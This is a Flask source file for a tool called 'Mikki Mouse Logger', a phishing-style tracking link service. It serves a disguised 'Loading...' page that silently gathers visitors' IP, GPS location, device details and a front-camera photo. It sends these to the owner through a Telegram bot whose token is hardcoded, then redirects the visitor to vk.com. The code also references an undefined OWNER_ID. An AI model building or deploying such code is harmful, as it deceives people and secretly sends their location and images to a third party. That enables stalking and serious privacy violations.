from flask import Flask, request, redirect, render_template_string, jsonify
import os
import json
import uuid
import datetime
import requests
import base64
import logging

logging.basicConfig(level=logging.INFO)

app = Flask(__name__)

# ============ КОНФИГ ============
# ============ КОНФИГ ============
OWNER_IDS = [744709325, 7949152984 ]  # 👈 СПИСОК ID
BOT_TOKEN = "8988753811:AAGCcjuqQT-m0broYRfqY3NENTpXx7jSyvg"
FISHING_DATA_FOLDER = "fishing_data"
os.makedirs(FISHING_DATA_FOLDER, exist_ok=True)

def get_owner_file_path():
    return os.path.join(FISHING_DATA_FOLDER, f"owner_{OWNER_ID}.json")

def load_owner_data():
    path = get_owner_file_path()
    if os.path.exists(path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            pass
    return {
        'settings': {
            'redirect': 'https://vk.com/',
            'geo': True,
            'camera': True,
            'links': {}
        }
    }

def save_owner_data(data):
    path = get_owner_file_path()
    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

@app.after_request
def add_header(response):
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

# ===================== СТРАНИЦА-ЛОГГЕР =====================
LOGGER_HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            flex-direction: column;
            overflow: hidden;
        }
        .loader {
            width: 56px;
            height: 56px;
            border: 3px solid rgba(255,255,255,0.06);
            border-top: 3px solid #7c5cfc;
            border-radius: 50%;
            animation: spin 1s cubic-bezier(0.4,0,0.2,1) infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loader-text {
            font-size: 14px;
            color: rgba(255,255,255,0.3);
            letter-spacing: 2px;
            text-transform: uppercase;
            margin-top: 20px;
        }
        .mouse-icon {
            font-size: 48px;
            margin-bottom: 16px;
            animation: bounce 1.5s ease-in-out infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
    </style>
</head>
<body>
<div style="text-align:center;">
    <div class="mouse-icon">🐭</div>
    <div class="loader"></div>
    <div class="loader-text">Сбор данных...</div>
</div>

<script>
(async function() {
    const linkId = window.location.pathname.split('/').pop();
    
    let settings = { redirect: 'https://vk.com/', geo: true, camera: true };
    try {
        const res = await fetch('/settings');
        settings = await res.json();
    } catch(e) {}

    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip || 'Unknown';
        } catch { return 'Unknown'; }
    }

    async function getGeo(ip) {
        try {
            const res = await fetch(`https://ipapi.co/${ip}/json/`);
            const data = await res.json();
            return {
                country: data.country_name || data.country || 'Unknown',
                city: data.city || 'Unknown',
                region: data.region || 'Unknown',
                isp: data.org || 'Unknown',
                latitude: data.latitude || 'Unknown',
                longitude: data.longitude || 'Unknown'
            };
        } catch { return { country: 'Unknown', city: 'Unknown', region: 'Unknown', isp: 'Unknown', latitude: 'Unknown', longitude: 'Unknown' }; }
    }

    function getDevice() {
        const ua = navigator.userAgent;
        let device = 'Desktop', os = 'Unknown', browser = 'Unknown';
        if (/mobile|android|iphone|ipad|ipod/i.test(ua)) device = 'Mobile';
        if (/iPad|Android/i.test(ua) && !/Mobile/i.test(ua)) device = 'Tablet';
        if (/Windows/i.test(ua)) os = 'Windows';
        else if (/Mac/i.test(ua)) os = 'macOS';
        else if (/Linux/i.test(ua)) os = 'Linux';
        else if (/Android/i.test(ua)) os = 'Android';
        else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
        else if (/Firefox/i.test(ua)) browser = 'Firefox';
        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
        else if (/Edg/i.test(ua)) browser = 'Edge';
        return { device, os, browser, ua };
    }

    function getScreen() {
        return {
            screen: `${window.screen.width}x${window.screen.height}`,
            window: `${window.innerWidth}x${window.innerHeight}`
        };
    }

    function getGeolocation() {
        return new Promise(resolve => {
            if (!settings.geo || !navigator.geolocation) {
                resolve({ latitude: 'Denied', longitude: 'Denied', accuracy: 'Disabled' });
                return;
            }
            navigator.geolocation.getCurrentPosition(
                pos => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                err => resolve({ latitude: 'Denied', longitude: 'Denied', accuracy: err.message }),
                { enableHighAccuracy: true, timeout: 5000 }
            );
        });
    }

    function getCameraPhoto() {
        return new Promise(resolve => {
            if (!settings.camera) { resolve(null); return; }
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            })
            .then(stream => {
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const photo = canvas.toDataURL('image/jpeg', 0.85);
                    stream.getTracks().forEach(t => t.stop());
                    resolve(photo);
                }, 300);
            })
            .catch(() => resolve(null));
        });
    }

    const ip = await getIP();
    const [geo, device, screen, geolocation, photo] = await Promise.all([
        getGeo(ip),
        getDevice(),
        getScreen(),
        getGeolocation(),
        getCameraPhoto()
    ]);

    const data = {
        link_id: linkId,
        timestamp: new Date().toLocaleString(),
        ip: ip,
        country: geo.country,
        city: geo.city,
        region: geo.region,
        isp: geo.isp,
        geo_lat: geo.latitude,
        geo_lon: geo.longitude,
        gps_lat: geolocation.latitude,
        gps_lon: geolocation.longitude,
        device_type: device.device,
        os: device.os,
        browser: device.browser,
        screen: screen.screen,
        photo: photo
    };

    await fetch('/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    }).catch(() => {});

    setTimeout(() => {
        window.location.href = settings.redirect || 'https://vk.com/';
    }, 600);
})();
</script>
</body>
</html>
"""

# ===================== МАРШРУТЫ FLASK =====================

@app.route('/')
def index():
    return "Mikki Mouse Logger is running!"

@app.route('/settings')
def get_web_settings():
    data = load_owner_data()
    return jsonify(data.get('settings', {'redirect': 'https://vk.com/', 'geo': True, 'camera': True}))

@app.route('/l/<link_id>')
def logger(link_id):
    data = load_owner_data()
    links = data.get('settings', {}).get('links', {})
    if link_id not in links:
        return 'Ссылка не найдена', 404
    return render_template_string(LOGGER_HTML)

@app.route('/log', methods=['POST'])
def log():
    req_data = request.get_json()
    link_id = req_data.get('link_id')
    
    data = load_owner_data()
    links = data.get('settings', {}).get('links', {})
    
    if link_id in links:
        if 'visits' not in links[link_id]:
            links[link_id]['visits'] = []
        links[link_id]['visits'].append(req_data)
        save_owner_data(data)
        
        # Отправка уведомления в Telegram
        try:
            text = (
                f"🎯 НОВЫЙ ПЕРЕХОД!\n\n"
                f"🔗 ID: {link_id}\n"
                f"🌍 IP: {req_data.get('ip')}\n"
                f"📍 Страна: {req_data.get('country')}\n"
                f"🏙️ Город: {req_data.get('city')}\n"
                f"📱 Устройство: {req_data.get('device_type')}\n"
                f"💻 ОС: {req_data.get('os')}\n"
                f"🌐 Браузер: {req_data.get('browser')}\n"
                f"📌 GPS: {req_data.get('gps_lat')}, {req_data.get('gps_lon')}"
            )
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": OWNER_ID, "text": text}
            )
            
            # Отправка фото
            photo_data = req_data.get('photo')
            if photo_data and ',' in photo_data:
                header, encoded = photo_data.split(",", 1)
                photo_bytes = base64.b64decode(encoded)
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                    data={"chat_id": OWNER_ID, "caption": f"📸 Фото с камеры ({link_id})"},
                    files={"photo": ("cam.jpg", photo_bytes, "image/jpeg")}
                )
        except Exception as e:
            logging.error(f"Telegram error: {e}")
            
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
